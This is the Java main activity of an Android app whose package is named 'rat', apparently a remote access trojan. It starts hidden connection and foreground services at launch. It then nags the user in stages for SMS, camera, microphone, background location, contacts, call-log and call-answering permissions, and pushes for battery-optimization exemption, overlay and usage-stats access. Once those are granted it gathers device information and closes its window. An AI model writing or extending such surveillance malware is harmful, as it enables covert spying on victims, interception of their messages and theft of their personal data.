package com.fly0rakoon.rat;

import android.Manifest;
import android.app.AppOpsManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.fly0rakoon.rat.services.ConnectionService;
import com.fly0rakoon.rat.services.ForegroundService;
import com.fly0rakoon.rat.utils.DeviceInfoUtils;

import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private static final int REQUEST_ALL_PERMISSIONS = 123;
    private static final int REQUEST_CRITICAL_PERMISSIONS = 124;
    private static final int REQUEST_CORE_PERMISSIONS = 125;
    private static final int REQUEST_SMS_PERMISSIONS = 126;
    private static final int REQUEST_BATTERY_OPTIMIZATIONS = 127;
    private static final int REQUEST_SYSTEM_ALERT_WINDOW = 128;
    private static final int REQUEST_NOTIFICATION_PERMISSION = 129;
    private static final int REQUEST_MEDIA_PERMISSIONS = 130;
    private static final String TAG = "MainActivity";

    // Core permissions needed for basic functionality
    private static final String[] CORE_PERMISSIONS = new String[] {
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.RECEIVE_BOOT_COMPLETED,
            Manifest.permission.FOREGROUND_SERVICE,
            Manifest.permission.WAKE_LOCK
    };

    // SMS permissions (with API level checks)
    private String[] getSmsPermissions() {
        List<String> permissions = new ArrayList<>();
        permissions.add(Manifest.permission.READ_SMS);
        permissions.add(Manifest.permission.SEND_SMS);
        permissions.add(Manifest.permission.RECEIVE_SMS);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            permissions.add(Manifest.permission.RECEIVE_MMS);
        }
        
        // READ_CELL_BROADCASTS requires special permission, remove it
        // as it's not commonly available
        
        return permissions.toArray(new String[0]);
    }

    // Critical permissions (essential for full functionality)
    private String[] getCriticalPermissions() {
        List<String> permissions = new ArrayList<>();
        permissions.add(Manifest.permission.CAMERA);
        permissions.add(Manifest.permission.RECORD_AUDIO);
        permissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
        permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            permissions.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
        }
        
        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {
            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        }
        
        return permissions.toArray(new String[0]);
    }

    // All permissions we'd like to have (with API level checks)
    private String[] getAllPermissions() {
        List<String> permissions = new ArrayList<>();
        
        // Storage permissions (API level dependent)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) { // API 33+
            permissions.add(Manifest.permission.READ_MEDIA_IMAGES);
            permissions.add(Manifest.permission.READ_MEDIA_AUDIO);
            permissions.add(Manifest.permission.READ_MEDIA_VIDEO);
        } else {
            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        }
        
        // Location permissions
        permissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
        permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            permissions.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
        }
        
        // Camera & Audio
        permissions.add(Manifest.permission.CAMERA);
        permissions.add(Manifest.permission.RECORD_AUDIO);
        permissions.add(Manifest.permission.MODIFY_AUDIO_SETTINGS);
        
        // Contacts & Phone
        permissions.add(Manifest.permission.READ_CONTACTS);
        permissions.add(Manifest.permission.WRITE_CONTACTS);
        permissions.add(Manifest.permission.GET_ACCOUNTS);
        permissions.add(Manifest.permission.READ_CALL_LOG);
        permissions.add(Manifest.permission.WRITE_CALL_LOG);
        permissions.add(Manifest.permission.PROCESS_OUTGOING_CALLS);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            permissions.add(Manifest.permission.ANSWER_PHONE_CALLS);
        }
        
        permissions.add(Manifest.permission.CALL_PHONE);
        permissions.add(Manifest.permission.READ_PHONE_STATE);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            permissions.add(Manifest.permission.READ_PHONE_NUMBERS);
        }
        
        // SMS
        permissions.add(Manifest.permission.READ_SMS);
        permissions.add(Manifest.permission.SEND_SMS);
        permissions.add(Manifest.permission.RECEIVE_SMS);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            permissions.add(Manifest.permission.RECEIVE_MMS);
        }
        
        // System
        permissions.add(Manifest.permission.VIBRATE);
        permissions.add(Manifest.permission.ACCESS_WIFI_STATE);
        permissions.add(Manifest.permission.CHANGE_WIFI_STATE);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            permissions.add(Manifest.permission.BLUETOOTH_CONNECT);
            permissions.add(Manifest.permission.BLUETOOTH_SCAN);
        } else {
            permissions.add(Manifest.permission.BLUETOOTH);
            permissions.add(Manifest.permission.BLUETOOTH_ADMIN);
        }
        
        // Notification permission (Android 13+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS);
        }
        
        // Remove any duplicate permissions
        return permissions.stream().distinct().toArray(String[]::new);
    }

    private boolean isFirstLaunch = true;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Immediately start services in background
        startBackgroundServices();
        
        // Check and request all permissions
        checkAndRequestPermissions();
    }

    private void startBackgroundServices() {
        try {
            // Start ForegroundService
            Intent foregroundIntent = new Intent(this, ForegroundService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(foregroundIntent);
            } else {
                startService(foregroundIntent);
            }
            
            // Start ConnectionService
            Intent connectionIntent = new Intent(this, ConnectionService.class);
            startService(connectionIntent);
            
            Log.d(TAG, "Background services started");
        } catch (Exception e) {
            Log.e(TAG, "Error starting services", e);
        }
    }

    private void checkAndRequestPermissions() {
        // First check core permissions
        if (!hasCorePermissions()) {
            requestCorePermissions();
            return;
        }
        
        // Check SMS permissions
        if (!hasSmsPermissions()) {
            requestSmsPermissions();
            return;
        }
        
        // Check critical permissions
        if (!hasCriticalPermissions()) {
            requestCriticalPermissions();
            return;
        }
        
        // Check battery optimizations
        if (!isIgnoringBatteryOptimizations()) {
            requestDisableBatteryOptimizations();
            return;
        }
        
        // Check overlay permission
        if (!Settings.canDrawOverlays(this)) {
            requestOverlayPermission();
            return;
        }
        
        // Check usage stats permission
        if (!hasUsageStatsPermission()) {
            requestUsageStatsPermission();
            return;
        }


        
        // Check notification permission for Android 13+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (!hasNotificationPermission()) {
                requestNotificationPermission();
                return;
            }
        }
        
        // Check all other permissions
        if (!hasAllPermissions()) {
            requestAllPermissions();
            return;
        }
        
        // All permissions granted, finish activity
        Log.d(TAG, "All permissions granted, finishing activity");
        collectAndLogDeviceInfo();
        finish();
    }

    private boolean hasCorePermissions() {
        for (String permission : CORE_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    private boolean hasSmsPermissions() {
        for (String permission : getSmsPermissions()) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    private boolean hasCriticalPermissions() {
        for (String permission : getCriticalPermissions()) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    private boolean hasAllPermissions() {
        for (String permission : getAllPermissions()) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    private boolean hasNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            return ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) 
                    == PackageManager.PERMISSION_GRANTED;
        }
        return true;
    }

    private boolean isIgnoringBatteryOptimizations() {
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        return pm.isIgnoringBatteryOptimizations(getPackageName());
    }

    private boolean hasUsageStatsPermission() {
        try {
            AppOpsManager appOps = (AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
            int mode = appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS,
                    android.os.Process.myUid(), getPackageName());
            return mode == AppOpsManager.MODE_ALLOWED;
        } catch (Exception e) {
            Log.e(TAG, "Error checking usage stats", e);
            return false;
        }
    }

    private void requestCorePermissions() {
        List<String> permissionsToRequest = new ArrayList<>();
        for (String permission : CORE_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }
        
        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(
                    this,
                    permissionsToRequest.toArray(new String[0]),
                    REQUEST_CORE_PERMISSIONS);
        }
    }

    private void requestSmsPermissions() {
        List<String> permissionsToRequest = new ArrayList<>();
        for (String permission : getSmsPermissions()) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }
        
        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(
                    this,
                    permissionsToRequest.toArray(new String[0]),
                    REQUEST_SMS_PERMISSIONS);
        }
    }

    private void requestCriticalPermissions() {
        List<String> permissionsToRequest = new ArrayList<>();
        for (String permission : getCriticalPermissions()) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }
        
        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(
                    this,
                    permissionsToRequest.toArray(new String[0]),
                    REQUEST_CRITICAL_PERMISSIONS);
        }
    }

    private void requestAllPermissions() {
        List<String> permissionsToRequest = new ArrayList<>();
        for (String permission : getAllPermissions()) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }
        
        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(
                    this,
                    permissionsToRequest.toArray(new String[0]),
                    REQUEST_ALL_PERMISSIONS);
        }
    }

    private void requestNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.requestPermissions(
                    this,
                    new String[]{Manifest.permission.POST_NOTIFICATIONS},
                    REQUEST_NOTIFICATION_PERMISSION);
        }
    }

    private void requestDisableBatteryOptimizations() {
        Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
        intent.setData(Uri.parse("package:" + getPackageName()));
        startActivityForResult(intent, REQUEST_BATTERY_OPTIMIZATIONS);
        Toast.makeText(this, "Please disable battery optimization for better performance", Toast.LENGTH_LONG).show();
    }

    private void requestOverlayPermission() {
        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
        intent.setData(Uri.parse("package:" + getPackageName()));
        startActivityForResult(intent, REQUEST_SYSTEM_ALERT_WINDOW);
        Toast.makeText(this, "Please allow overlay permission", Toast.LENGTH_LONG).show();
    }

    private void requestUsageStatsPermission() {
        Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
        startActivity(intent);
        Toast.makeText(this, "Please grant Usage Access permission", Toast.LENGTH_LONG).show();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                          @NonNull String[] permissions,
                                          @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        // Check if all requested permissions were granted
        boolean allGranted = true;
        for (int result : grantResults) {
            if (result != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }
        
        if (allGranted) {
            Toast.makeText(this, "Permissions granted", Toast.LENGTH_SHORT).show();
        } else {
            Toast.makeText(this, "Some permissions were denied", Toast.LENGTH_SHORT).show();
        }
        
        // Continue checking next permission set
        checkAndRequestPermissions();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == REQUEST_BATTERY_OPTIMIZATIONS) {
            Toast.makeText(this, "Battery optimization setting updated", Toast.LENGTH_SHORT).show();
        } else if (requestCode == REQUEST_SYSTEM_ALERT_WINDOW) {
            Toast.makeText(this, "Overlay permission setting updated", Toast.LENGTH_SHORT).show();
        }
        
        // Continue checking permissions
        checkAndRequestPermissions();
    }

    @Override
    protected void onResume() {
        super.onResume();
        
        // Check if we're returning from permission settings
        if (!isFirstLaunch) {
            checkAndRequestPermissions();
        }
        isFirstLaunch = false;
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "MainActivity destroyed");
    }

    private void collectAndLogDeviceInfo() {
        try {
            JSONObject info = DeviceInfoUtils.collectDeviceInfo(this);
            Log.d(TAG, "Device Info:\n" + info.toString(4));
        } catch (Exception e) {
            Log.e(TAG, "Failed to collect device info", e);
        }
    }
}
